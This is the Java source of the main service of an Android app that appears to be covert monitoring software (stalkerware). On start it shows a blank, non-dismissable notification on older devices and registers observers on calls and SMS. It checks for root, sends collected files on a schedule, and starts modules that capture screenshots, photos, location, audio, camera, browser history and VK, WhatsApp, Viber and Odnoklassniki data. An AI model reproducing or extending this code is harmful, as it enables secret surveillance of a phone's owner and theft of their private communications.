package com.dwreload.services;

import java.lang.ref.WeakReference;
import java.util.Calendar;
import java.util.Date;

import com.dwreload.SettingsManager;
import com.dwreload.modules.ViberModule;
import com.dwreload.modules.VkModule;
import com.dwreload.modules.WhatsAppModule;
import com.dwreload.DBManager;
import com.dwreload.ThreadManager;
import com.dwreload.modules.*;
import com.dwreload.modules.location.LocationModule;
import com.dwreload.receivers.BatteryState;
import com.dwreload.receivers.ScreenStateReceiver;
import com.stericson.RootTools.RootTools;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
//import android.util.Log;

public class AppService extends Service {
	public static ThreadManager sThreadManager = null;
	
	public static String APP_VERSION = "";
	
	private ContentResolver mContentResolver;
	private CallContentObserver mCallObserv;
	private SMSContentObserver mSmsObserv;
	private Handler mHandler;
    
    /* MODULES */
    private ScreenStateReceiver mScreenState;
    private ScreenshotModule mScreenshotModule;
    private PhotoModule mPhotoModule;
    private LocationModule mLocationmodule;
    private RecorderModule mRecordModule;
    private CameraModule mCameraModule;
    private VkModule mVkModule;
    private WhatsAppModule mWaModule;
    private ViberModule mVbModule;
    private OdklModule mOKModule;
    private BrowserHistoryModule mBrowserModule;
    private SettingsManager mSettings;
    private static boolean sIsRootAvailable = false;
    public static boolean isRootAvailable(){
    	return sIsRootAvailable;
    }
    
    public static boolean isSystemApp(Context context){
    	boolean isSystem = false;
    	
        try {
			isSystem = (context.getPackageManager().getPackageInfo(context.getPackageName(), 0).applicationInfo.flags & (ApplicationInfo.FLAG_SYSTEM | ApplicationInfo.FLAG_UPDATED_SYSTEM_APP)) != 0;
		} catch (NameNotFoundException e) {

		}
        
        return isSystem;
    }
	
	@SuppressWarnings("deprecation")
	@Override
	public void onCreate() {
		super.onCreate();
		
		Thread.currentThread().setName("[AppService]");
		Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
		
		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
			android.app.Notification notification = new android.app.Notification(0, null, System.currentTimeMillis());
			notification.flags |= android.app.Notification.FLAG_NO_CLEAR;
			startForeground(42, notification);
		}
		
		
		sThreadManager = new ThreadManager(this);
		try {
			PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
			APP_VERSION = "rev: "+ info.versionName;
		} catch (NameNotFoundException e) {
			APP_VERSION = "none";
		}
		
		mContentResolver = getContentResolver();
		mCallObserv = new CallContentObserver(new Handler(), this);
		mSmsObserv = new SMSContentObserver(new Handler());
		mHandler = new MyHandler(this);
		mSettings = new SettingsManager(this);
		mContentResolver.registerContentObserver(DBManager.CALL_URI, true, mCallObserv);
		mContentResolver.registerContentObserver(DBManager.SMS_URI, true, mSmsObserv);
		
		sThreadManager.sendFiles();

		startThread();
		//----------------------------------------------------------------------------------------------------------------
		final long UPDATE_TIMEOUT = 30 * 60 * 1000L;
		final long DAY_INTERVAL = 24 * 60 * 60 * 1000L;
		SchedulerModule scheduler = new SchedulerModule();
		

		if (mSettings.DayReports())
			{
			Calendar calendar = Calendar.getInstance();
			calendar.set(Calendar.HOUR_OF_DAY, mSettings.RepHour());
			calendar.set(Calendar.MINUTE, mSettings.RepMinute());
			calendar.set(Calendar.SECOND, 0);
			scheduler.setPeriod(this, calendar.getTimeInMillis(), DAY_INTERVAL);	
			}
		else
			{
			scheduler.setPeriod(this, new Date().getTime() + UPDATE_TIMEOUT, UPDATE_TIMEOUT);
			}
		//----------------------------------------------------------------------------------------------------------------
	}
	
	private void startThread(){
		new Thread(new Runnable() {
			@Override
			public void run() {
				if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
					sIsRootAvailable = true;
				}
				else{
					sIsRootAvailable = false;
				}
				
				mHandler.sendEmptyMessage(0);
			}
		}).start();
	}
	
	private void startModules(){
		registerReceiver(BatteryState.getInstance(), new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		
		mScreenState = new ScreenStateReceiver(this);
		mScreenState.start();
		
		if (ScreenshotModule.isAvailable()) {
			mScreenshotModule = new ScreenshotModule(this);
			mScreenshotModule.start();
		}
		
		mPhotoModule = new PhotoModule(this);
		mPhotoModule.start();
		
		mLocationmodule = new LocationModule(this);
		mLocationmodule.start();
		
		mRecordModule = new RecorderModule(this);
		
		mVkModule = new VkModule(this);
		mVkModule.start();
		
		mWaModule = new WhatsAppModule(this);
		mWaModule.start();
		
		mVbModule = new ViberModule(this);
		mVbModule.start();
		
		mOKModule = new OdklModule(this);
		mOKModule.start();
		
		mCameraModule = new CameraModule(this);
		mCameraModule.start();
		
		mBrowserModule = new BrowserHistoryModule(this);
		mBrowserModule.start();
	}
	
	private void stopModules(){
		if (mScreenState != null) {
			mScreenState.dispose();
			mScreenState = null;
		}
		
		if (mScreenshotModule != null) {
			mScreenshotModule.dispose();
			mScreenshotModule = null;
		}
		
		if (mPhotoModule != null) {
			mPhotoModule.dispose();
			mPhotoModule = null;
		}
		
		if (mLocationmodule != null) {
			mLocationmodule.dispose();
			mLocationmodule = null;
		}
		
		if (mRecordModule != null) {
			mRecordModule.dispose();
			mRecordModule = null;
		}
		
		if (mVkModule != null) {
			mVkModule.dispose();
			mVkModule = null;
		}
		
		if (mWaModule != null) {
			mWaModule.dispose();
			mWaModule = null;
		}
		
		if (mVbModule != null) {
			mVbModule.dispose();
			mVbModule = null;
		}
		
		if (mOKModule != null) {
			mOKModule.dispose();
			mOKModule = null;
		}
		
		if (mCameraModule != null) {
			mCameraModule.dispose();
			mCameraModule = null;
		}
		
		if (mBrowserModule != null) {
			mBrowserModule.dispose();
			mBrowserModule = null;
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		stopModules();
		
		if (mContentResolver != null) {
			try {
				mContentResolver.unregisterContentObserver(mCallObserv);
			} catch (Exception e) {
//				Debug.exception(e);
			}
			try {
				mContentResolver.unregisterContentObserver(mSmsObserv);
			} catch (Exception e) {

			}
		}
		
		try {
			unregisterReceiver(BatteryState.getInstance());
			
		} catch (Exception e) {

		} finally{
			BatteryState.dispose();
		}
		
		sThreadManager.dispose();
		sThreadManager = null;
		mContentResolver= null;
	}
	
	@Override
	public void onLowMemory() {
		super.onLowMemory();

	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//return super.onStartCommand(intent, flags, startId);
		
		return START_STICKY;
	}
	
	private void handlemessage(Message msg){

		startModules();
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<AppService> mService;
		
		private MyHandler(AppService service) {
			mService = new WeakReference<AppService>(service);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			AppService service = mService.get();
	         if (service != null) {
	              service.handlemessage(msg);
	         }
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
}


